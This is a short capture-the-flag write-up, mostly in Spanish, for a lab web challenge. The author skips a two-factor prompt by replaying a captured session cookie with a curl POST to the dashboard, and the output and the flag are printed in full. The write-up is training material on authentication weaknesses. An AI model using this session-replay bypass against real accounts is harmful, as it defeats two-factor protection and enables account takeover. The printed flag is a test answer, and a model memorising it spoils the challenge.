## Descripcion

This website puts a two-factor prompt between you and the flag. Register an account, then take a close look at the requests your browser is actually sending. Try [here](http://xebec.cylabacademy.net:36112/) to find the flag

Try using burpsuite to intercept request to capture the flag.
Try mangling the request, maybe their server-side code doesn't handle malformed requests very well.
## solucion 
```

![[Pasted image 20260926201235.png]]
al registrarnos en la pajina esta nos pide la 
## 2fa authentication

y en el apartado de cookies se mando nuestra peticion o algo haci
.eJwtjUEKwyAURK8SXHfhN5pod4XkEt2EH_2hoVGDGkopvXsNdDlv3jAfZtfyZld2R4uFLGZ2YTanZSrxSaEWUgDa3pGAVlngbuGIcpaCKyNncEJDpw22UHfLsW1TQE91NvodAzpsbrlQiqujZiBPwa64VTWWvUq8F1LyGnfM-RWTqwxEK1XXa3PiRww0hcPPlE5dgdLGKN3X7siU_l_DePPs-wPBwjzp.arh5tg.23L1opHFm53UEoH2TBLdxxnF5EQ


Blurpsuite... congela mi pc, haci que toca usar la consola y maximo esfuerzo

curl -s -X POST http://xebec.cylabacademy.net:36112/dashboard -b "session=.eJwtjUEKwyAURK8SXHfhN5pod4XkEt2EH_2hoVGDGkopvXsNdDlv3jAfZtfyZld2R4uFLGZ2YTanZSrxSaEWUgDa3pGAVlngbuGIcpaCKyNncEJDpw22UHfLsW1TQE91NvodAzpsbrlQiqujZiBPwa64VTWWvUq8F1LyGnfM-RWTqwxEK1XXa3PiRww0hcPPlE5dgdLGKN3X7siU_l_DePPs-wPBwjzp.arh5tg.23L1opHFm53UEoH2TBLdxxnF5EQ"


... 
┌──(jeex㉿LAPTOP-77F4GRAK)-[~]
└─$ curl -s -X POST http://xebec.cylabacademy.net:36112/dashboard -b "session=.eJwtjUEKwyAURK8SXHfhN5pod4XkEt2EH_2hoVGDGkopvXsNdDlv3jAfZtfyZld2R4uFLGZ2YTanZSrxSaEWUgDa3pGAVlngbuGIcpaCKyNncEJDpw22UHfLsW1TQE91NvodAzpsbrlQiqujZiBPwa64VTWWvUq8F1LyGnfM-RWTqwxEK1XXa3PiRww0hcPPlE5dgdLGKN3X7siU_l_DePPs-wPBwjzp.arh5tg.23L1opHFm53UEoH2TBLdxxnF5EQ"
Welcome, DEAm you sucessfully bypassed the OTP request.
Your Flag: academy{#0TP_Bypvss_SuCc3$S_f182f0ef}
┌──(jeex㉿LAPTOP-77F4GRAK)-[~]
└─$



```

```
academy{#0TP_Bypvss_SuCc3$S_f182f0ef}
```
## notas adicionales


... blurpsuite porque estas echo en javaaaaa!!!
## referencias
